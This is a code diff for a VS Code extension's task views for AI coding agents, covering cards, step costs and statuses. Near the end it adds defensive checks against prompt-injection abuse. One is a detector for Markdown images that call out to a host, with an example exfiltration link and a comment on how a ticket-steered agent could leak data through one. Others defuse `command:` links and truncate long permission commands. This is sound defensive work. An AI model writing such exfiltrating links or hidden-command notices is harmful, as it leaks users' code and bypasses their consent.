@@ -1,12 +1,14 @@
 // UI models built from a task's state and events: cards for lists, a step timeline, the activity feed.
-import { transition, passSteps, sameStep, branchName, MAX_EMPTY_ROUNDS } from './machine';
+import * as path from 'path';
+import { transition, passSteps, sameStep, branchName, spentOf, MAX_EMPTY_ROUNDS } from './machine';
 import { onRepos } from './pipeline';
-import { describeEvent, CHECKPOINT_TITLE } from './describe';
+import { describeEvent, checkpointTitle } from './describe';
 import { transcriptKey } from './engine';
 import { resultOf } from './report';
+import { parseInvocation } from './intake';
 import type { OrchEvent, Source, StepRef, TaskState } from './types';
 
-import type { Card, FeedEvent, Live, PermissionRequest, Status, StepItem, TaskDetail, TaskError, TaskSource, UsageItem } from './wire';
+import type { Card, FeedEvent, Live, PermissionRequest, Status, StepItem, TaskDetail, TaskError, TaskPush, TaskSource, UsageItem } from './wire';
 /** The part of the engine the UI models read. */
 interface ViewEngine {
   isRunning(taskId: string): boolean;
@@ -16,11 +18,13 @@ interface ViewEngine {
   liveCost: Map<string, number>;
   liveUsage: Map<string, UsageItem & { key: string }>;
   sessions: Map<string, unknown>;
+  inTurn: Set<string>;
   svc: {
-    events(taskId: string): OrchEvent[];
-    state(taskId: string): TaskState;
-    files(taskId: string): { path: string; size: number; mtime: number }[];
+    events(taskId: string): Promise<OrchEvent[]>;
+    state(taskId: string): Promise<TaskState>;
+    files(taskId: string): Promise<{ path: string; size: number; mtime: number }[]>;
     dir(taskId: string): string;
+    runsElsewhere(taskId: string): Promise<number | null>;
   };
 }
 
@@ -30,6 +34,8 @@ interface TaskEntry {
   state?: TaskState;
   corrupt?: boolean;
   error?: string;
+  /** For a corrupt one: when its log last changed, since no state says so. */
+  at?: string;
 }
 
 const VERDICT_LABEL: Record<string, string> = { ready: 'Ready', not_ready: 'Not ready', needs_check: 'Needs a human check' };
@@ -45,7 +51,27 @@ const CHECKPOINT_HINT: Record<string, string> = {
 
 const EMPTY_DIFF_HINT = 'The last review rounds saw an empty diff: the agents changed nothing, so more fix rounds would not help. Add guidance and retry, ship as it is, or stop.';
 
-const titleOf = (s: TaskState | null | undefined, taskId: string): string => (s && s.spec && s.spec.title) || (s && s.input ? s.input.split('\n')[0]!.slice(0, 100) : taskId);
+/** What a waiting task's notice says of its checkpoint. */
+function hintOf(state: TaskState): string | undefined {
+  const cp = state.checkpoint!;
+  if (cp.id === 'review-limit' && state.review.emptyRounds >= MAX_EMPTY_ROUNDS) return EMPTY_DIFF_HINT;
+  if (cp.id === 'agent-failure' && cp.blocked) return 'An agent reported it cannot go on, and why.';
+  const hint = CHECKPOINT_HINT[cp.id];
+  return cp.repeated && hint ? `${hint} It failed the same way as the attempt before.` : hint;
+}
+
+/** The ticket's title, or before there is one the first line of what was typed, without its flags (`--auto`). */
+function titleOf(s: TaskState | null | undefined, taskId: string): string {
+  if (s && s.spec && s.spec.title) return s.spec.title;
+  if (!s || !s.input) return taskId;
+  let text = s.input;
+  try {
+    text = parseInvocation(s.input).input || s.input;
+  } catch {
+    // flags it cannot read: shown as typed
+  }
+  return text.split('\n')[0]!.slice(0, 100);
+}
 
 function sourceOf(s: TaskState | null | undefined): TaskSource | null {
   if (!s) return null;
@@ -54,12 +80,6 @@ function sourceOf(s: TaskState | null | undefined): TaskSource | null {
   if (src.kind === 'jira') return { kind: 'jira', label: src.key, url: (link && link.url) || (src.site ? `https://${src.site}/browse/${src.key}` : undefined) };
   if (src.kind === 'confluence') return { kind: 'confluence', label: 'Confluence page', url: src.url };
   return { kind: 'text', label: 'Description' };
-}
-
-function costOf(events: OrchEvent[]): number {
-  let cost = 0;
-  for (const e of events) if (e.type === 'agent_stopped') cost += Number((e.payload && e.payload.costUsd) || 0);
-  return cost;
 }
 
 /** Executed steps, from the log, plus what is still to come. */
@@ -73,6 +93,7 @@ function stepsOf(events: OrchEvent[], state: TaskState, { running }: { running: 
     for (let i = steps.length - 1; i >= 0; i--) if (pred(steps[i]!)) return steps[i]!;
     return null;
   };
+  const totals = new Map<StepItem, Map<string, { costUsd: number; turns: number; tokens: number }>>();
   for (const e of events) {
     switch (e.type) {
       case 'stage_started':
@@ -93,18 +114,23 @@ function stepsOf(events: OrchEvent[], state: TaskState, { running }: { running: 
         if (st) st.gateRuns = [...(st.gateRuns || []), { attempt: e.attempt, status: e.status }];
         break;
       }
+      case 'agent_progress':
       case 'agent_stopped': {
         const p = e.payload || {};
         const st = (p.transcript && findLast((x) => x.key === p.transcript)) || findLast((x) => x.agent === e.agent);
         if (st) {
-          st.costUsd = (st.costUsd || 0) + Number(p.costUsd || 0);
-          st.turns = (st.turns || 0) + Number(p.turns || 0);
+          // A session reports running totals: each counts once, at its latest, and a step adds up its sessions.
+          const sessions = totals.get(st) || new Map<string, { costUsd: number; turns: number; tokens: number }>();
+          totals.set(st, sessions);
+          const id = p.sessionId || `#${e.seq}`;
+          const was = sessions.get(id) || { costUsd: 0, turns: 0, tokens: 0 };
+          sessions.set(id, { costUsd: Math.max(was.costUsd, Number(p.costUsd) || 0), turns: Math.max(was.turns, Number(p.turns) || 0), tokens: Math.max(was.tokens, Number(p.tokens) || 0) });
           if (p.sessionId) st.sessionId = p.sessionId;
           if (p.cwd) st.cwd = p.cwd;
+          if (p.configDir) st.configDir = p.configDir;
           if (p.model) st.model = p.model;
           if (p.effort) st.effort = p.effort;
           if (p.ctxPct !== undefined) st.ctxPct = p.ctxPct;
-          if (p.tokens) st.tokens = (st.tokens || 0) + p.tokens;
         }
         break;
       }
@@ -112,11 +138,18 @@ function stepsOf(events: OrchEvent[], state: TaskState, { running }: { running: 
     const r = transition(s, e);
     if (r.ok) s = r.state;
   }
+  for (const [st, sessions] of totals) {
+    const all = [...sessions.values()];
+    st.costUsd = all.reduce((n, x) => n + x.costUsd, 0);
+    st.turns = all.reduce((n, x) => n + x.turns, 0);
+    const tokens = all.reduce((n, x) => n + x.tokens, 0);
+    if (tokens) st.tokens = tokens;
+  }
   // The step the state still calls running: live here, or interrupted (VS Code closed, or another tool runs it).
   for (const st of steps) if (st.kind === 'agent' && st.status === 'running' && !(state.running && sameStep(state.running, st as StepRef) && running)) st.status = state.status === 'stopped' ? 'paused' : 'interrupted';
 
   if (state.checkpoint && state.checkpoint.id !== 'confirm-push') {
-    steps.push({ kind: 'human', id: state.checkpoint.id, label: CHECKPOINT_TITLE[state.checkpoint.id]!, status: state.status === 'stopped' ? 'paused' : 'waiting' });
+    steps.push({ kind: 'human', id: state.checkpoint.id, label: checkpointTitle(state.checkpoint), status: state.status === 'stopped' ? 'paused' : 'waiting' });
   }
 
   const upcoming: StepItem[] = [];
@@ -150,11 +183,29 @@ function stepsOf(events: OrchEvent[], state: TaskState, { running }: { running: 
   return [...steps, ...upcoming];
 }
 
-function statusOf(state: TaskState | null, { running, error, corrupt, asking }: { running?: boolean; error?: unknown; corrupt?: boolean; asking?: boolean }): Status {
+/** What Resume runs from where it is. */
+const RESUMABLE = new Set(['stopped', 'failed', 'interrupted', 'ready']);
+
+interface StatusFlags {
+  running?: boolean;
+  /** Another VS Code window on this workspace runs the task now. */
+  elsewhere?: boolean;
+  error?: unknown;
+  corrupt?: boolean;
+  asking?: boolean;
+}
+
+function statusOf(state: TaskState | null, flags: StatusFlags): Status {
+  const status = baseStatus(state, flags);
+  return { ...status, resumable: RESUMABLE.has(status.key) };
+}
+
+function baseStatus(state: TaskState | null, { running, elsewhere, error, corrupt, asking }: StatusFlags): Omit<Status, 'resumable'> {
   if (corrupt) return { key: 'corrupt', label: 'Unreadable', tone: 'error', group: 'attention' };
   if (running && asking) return { key: 'running', label: 'Asks your permission', tone: 'warn', group: 'attention' };
   if (running) return { key: 'running', label: 'Running', tone: 'accent', group: 'running' };
-  if (state!.status === 'waiting') return { key: 'waiting', label: CHECKPOINT_TITLE[state!.checkpoint!.id] || 'Needs you', tone: 'warn', group: 'attention' };
+  if (elsewhere && state!.status === 'active') return { key: 'elsewhere', label: 'Running in another window', tone: 'accent', group: 'running' };
+  if (state!.status === 'waiting') return { key: 'waiting', label: checkpointTitle(state!.checkpoint!), tone: 'warn', group: 'attention' };
   if (state!.status === 'done') {
     const r = resultOf(state!);
     if (r && r.kind === 'readiness') return { key: 'done', label: VERDICT_LABEL[r.verdict]!, tone: r.verdict === 'ready' ? 'ok' : 'warn', group: 'done' };
@@ -165,7 +216,7 @@ function statusOf(state: TaskState | null, { running, error, corrupt, asking }: 
     const label = state!.outcome === 'published' ? 'PRs opened' : state!.outcome === 'local' ? 'Kept local' : 'Done';
     return { key: 'done', label, tone: 'ok', group: 'done' };
   }
-  if (state!.status === 'stopped') return { key: 'stopped', label: state!.checkpoint ? `Stopped at: ${CHECKPOINT_TITLE[state!.checkpoint.id]}` : 'Stopped', tone: 'muted', group: 'stopped' };
+  if (state!.status === 'stopped') return { key: 'stopped', label: state!.checkpoint ? `Stopped at: ${checkpointTitle(state!.checkpoint)}` : 'Stopped', tone: 'muted', group: 'stopped' };
   if (error) return { key: 'failed', label: 'Run failed', tone: 'error', group: 'attention' };
   if (state!.running) return { key: 'interrupted', label: 'Interrupted', tone: 'warn', group: 'attention' };
   return { key: 'ready', label: 'Ready to continue', tone: 'muted', group: 'stopped' };
@@ -184,30 +235,58 @@ interface Derived {
  */
 const derivedCache = new WeakMap<TaskState, Map<boolean, Derived>>();
 
-function derive(engine: ViewEngine, taskId: string, state: TaskState, running: boolean): Derived {
+async function derive(engine: ViewEngine, taskId: string, state: TaskState, running: boolean): Promise<Derived> {
   const byRunning = derivedCache.get(state) ?? new Map<boolean, Derived>();
   const hit = byRunning.get(running);
   if (hit) return hit;
   let events: OrchEvent[] = [];
   try {
-    events = engine.svc.events(taskId);
+    events = await engine.svc.events(taskId);
   } catch {
     // raced with a delete
   }
-  const derived = { steps: stepsOf(events, state, { running }), cost: costOf(events), lastStop: [...events].reverse().find((e) => e.type === 'stopped') };
+  const derived = { steps: stepsOf(events, state, { running }), cost: spentOf(events), lastStop: [...events].reverse().find((e) => e.type === 'stopped') };
   byRunning.set(running, derived);
   derivedCache.set(state, byRunning);
   return derived;
 }
 
+/** The card of a task whose log does not replay: every field a card has, so a list shows it beside the others. */
+function corruptCard(taskId: string, error: string | undefined, at = new Date(0).toISOString()): Card {
+  return {
+    taskId,
+    title: taskId,
+    source: null,
+    scenario: 'deliver',
+    status: statusOf(null, { corrupt: true }),
+    checkpoint: null,
+    live: null,
+    error: { message: `its log cannot be read: ${error || 'unknown error'}` },
+    stopReason: undefined,
+    round: 0,
+    maxRounds: 0,
+    phase: 'done',
+    outcome: undefined,
+    prs: {},
+    branch: null,
+    repos: [],
+    cost: 0,
+    createdAt: at,
+    updatedAt: at,
+    progress: { done: 0, total: 0 },
+    mini: [],
+  };
+}
+
 /** A compact card for lists and the tree. */
-function summary(engine: ViewEngine, entry: TaskEntry): Card {
+async function summary(engine: ViewEngine, entry: TaskEntry): Promise<Card> {
   const taskId = entry.taskId;
-  if (entry.corrupt) return { taskId, title: taskId, status: statusOf(null, { corrupt: true }), error: { message: entry.error }, steps: [], cost: 0 } as unknown as Card;
+  if (entry.corrupt) return corruptCard(taskId, entry.error, entry.at);
   const state = entry.state!;
   const running = engine.isRunning(taskId);
+  const elsewhere = !running && state.status === 'active' && (await engine.svc.runsElsewhere(taskId)) !== null;
   const error = engine.lastError(taskId);
-  const { steps, cost, lastStop } = derive(engine, taskId, state, running);
+  const { steps, cost, lastStop } = await derive(engine, taskId, state, running);
   const agentSteps = steps.filter((s) => s.kind !== 'human' || s.status !== 'pending');
   const result = resultOf(state);
   return {
@@ -218,8 +297,8 @@ function summary(engine: ViewEngine, entry: TaskEntry): Card {
     ...(state.scenarioLabel && { scenarioLabel: state.scenarioLabel }),
     ...(state.group && { group: state.group }),
     ...(result && { result: result.kind === 'readiness' ? { kind: 'readiness', verdict: result.verdict, met: result.met, total: result.criteria.length } : { kind: 'audit', counts: result.counts } }),
-    status: statusOf(state, { running, error, asking: engine.pendingPermissions(taskId).length > 0 }),
-    checkpoint: state.checkpoint ? { id: state.checkpoint.id, title: CHECKPOINT_TITLE[state.checkpoint.id], hint: state.checkpoint.id === 'review-limit' && state.review.emptyRounds >= MAX_EMPTY_ROUNDS ? EMPTY_DIFF_HINT : CHECKPOINT_HINT[state.checkpoint.id] } : null,
+    status: statusOf(state, { running, elsewhere, error, asking: engine.pendingPermissions(taskId).length > 0 }),
+    checkpoint: state.checkpoint ? { id: state.checkpoint.id, title: checkpointTitle(state.checkpoint), hint: hintOf(state) } : null,
     live: engine.live(taskId),
     error,
     stopReason: state.status === 'stopped' && lastStop && lastStop.type === 'stopped' ? lastStop.reason : undefined,
@@ -239,11 +318,11 @@ function summary(engine: ViewEngine, entry: TaskEntry): Card {
 }
 
 /** Everything the task screen shows. */
-function detail(engine: ViewEngine, taskId: string): TaskDetail {
-  const state = engine.svc.state(taskId);
-  const events = engine.svc.events(taskId);
+async function detail(engine: ViewEngine, taskId: string): Promise<TaskDetail> {
+  const state = await engine.svc.state(taskId);
+  const events = await engine.svc.events(taskId);
   const running = engine.isRunning(taskId);
-  const card = summary(engine, { taskId, state });
+  const card = await summary(engine, { taskId, state });
   return {
     ...card,
     input: state.input,
@@ -259,18 +338,84 @@ function detail(engine: ViewEngine, taskId: string): TaskDetail {
     result: resultOf(state),
     comments: events.filter((e) => e.type === 'jira_comment').map((e) => ({ seq: e.seq, at: e.at, key: e.key, what: e.what, ok: e.ok, via: e.via, ...(e.error && { error: e.error }) })),
     answers: state.answers,
-    steps: stepsOf(events, state, { running }),
+    steps: (await derive(engine, taskId, state, running)).steps,
     events: events.flatMap((e): FeedEvent[] => {
       const d = describeEvent(e);
       return d && d.text ? [{ seq: e.seq, at: e.at, type: e.type, ...d }] : [];
     }),
-    files: engine.svc.files(taskId),
+    files: await engine.svc.files(taskId),
     taskDir: engine.svc.dir(taskId),
     permissions: engine.pendingPermissions(taskId),
-    canMessage: engine.sessions.has(taskId),
+    canMessage: engine.sessions.has(taskId) && engine.inTurn.has(taskId),
     liveUsage: engine.liveUsage.get(taskId) || null,
   };
 }
 
-export type { Card, Status, StepItem, TaskEntry, TaskError, ViewEngine };
-export { summary, detail, stepsOf, statusOf, CHECKPOINT_HINT };
+type OutputPush = Extract<TaskPush, { type: 'output' }>;
+
+/**
+ * Queues one streamed item for the page. Text the agent writes arrives a few characters at a time: consecutive pieces
+ * of one step merge into one message, so the host posts a handful of messages per flush instead of one per token.
+ */
+function queueOutput(queue: OutputPush[], push: OutputPush): void {
+  const last = queue[queue.length - 1];
+  if (last && push.item.type === 'text_delta' && last.item.type === 'text_delta' && last.taskId === push.taskId && last.key === push.key) {
+    last.item = { ...last.item, text: last.item.text + push.item.text };
+  } else queue.push({ ...push, item: { ...push.item } as OutputPush['item'] });
+}
+
+export type { Card, OutputPush, Status, StepItem, TaskEntry, TaskError, ViewEngine };
+/**
+ * Whether Markdown loads something from the web when shown: an image or a reference an image uses at an address
+ * (`![](https://host/?q=<the code>)`). VS Code's preview fetches them; an agent steered by a ticket could write one
+ * into a report, and opening it would send what it carries past the sandbox.
+ */
+function loadsRemote(markdown: string): boolean {
+  return /!\[[^\]\n]{0,300}\]\(\s*<?(?:https?:)?\/\//i.test(markdown) || /<(?:img|image|source|video|audio|iframe|object|embed|link)\b[^>]*\b(?:src|href|srcset|data|poster)\s*=\s*["']?\s*(?:https?:)?\/\//i.test(markdown) || (/!\[/.test(markdown) && /^\s{0,3}\[[^\]\n]+\]:\s*<?(?:https?:)?\/\//m.test(markdown));
+}
+
+/**
+ * Text for a notification, shown as it is written. In a notification's message VS Code makes `[label](command:…)` (or
+ * `file:`, `https:`) a link it opens on a click, commands included; the text may come from an agent, a ticket, an MCP
+ * server or the output of git and gh. A space between `]` and `(` leaves the brackets as text, and a bare `command:` or
+ * `vscode:` address gets a zero-width space before its colon.
+ */
+function plainNotice(text: string): string {
+  return text.replace(/\]\(/g, '] (').replace(/\b(command|vscode)(?=:)/gi, '$1​');
+}
+
+/**
+ * Whether a value is a web address, the only kind opened outside the editor: a PR's value may be whatever `gh` printed,
+ * and a `command:`, `file:` or `vscode:` address would run something or open a file instead.
+ */
+function isWebLink(url: unknown): url is string {
+  return typeof url === 'string' && /^https?:\/\/\S+$/i.test(url);
+}
+
+/** An engine's `log` event as a line of the extension's log: its level (anything else is info) and its task. */
+function logLine({ level, message, taskId }: { level: string; message: string; taskId?: string }): { level: 'error' | 'warn' | 'info'; text: string } {
+  return { level: level === 'error' || level === 'warn' ? level : 'info', text: taskId ? `[${taskId}] ${message}` : message };
+}
+
+/** The longest command a permission notification shows. */
+const NOTICE_COMMAND = 120;
+
+/**
+ * A permission request as a notification says it, and whether it says all of it. A notification has room for one
+ * short line (and shows no `detail`): a longer command, or one with line breaks or invisible characters, is shown cut,
+ * and the notification then offers no Allow, only the dashboard, which shows it whole.
+ */
+function permissionNotice(p: Pick<PermissionRequest, 'agent' | 'repo' | 'tool' | 'input'>): { text: string; whole: boolean } {
+  const input = typeof p.input === 'object' && p.input !== null ? (p.input as Record<string, unknown>) : {};
+  let what = `use ${p.tool}`;
+  let whole = true;
+  if (p.tool === 'Bash') {
+    const command = typeof input.command === 'string' ? input.command : '';
+    const flat = command.replace(/[\p{Cc}\p{Cf}]+/gu, ' ');
+    whole = flat === command && command.length <= NOTICE_COMMAND;
+    what = `run \`${whole ? command : `${flat.slice(0, NOTICE_COMMAND)}…`}\``;
+  } else if (typeof input.file_path === 'string') what = `${p.tool.toLowerCase()} ${path.basename(input.file_path)}`;
+  return { text: plainNotice(`${p.agent}${p.repo ? ` @ ${p.repo}` : ''} wants to ${what}`), whole };
+}
+
+export { isWebLink, loadsRemote, logLine, permissionNotice, plainNotice, summary, detail, stepsOf, statusOf, queueOutput, CHECKPOINT_HINT };
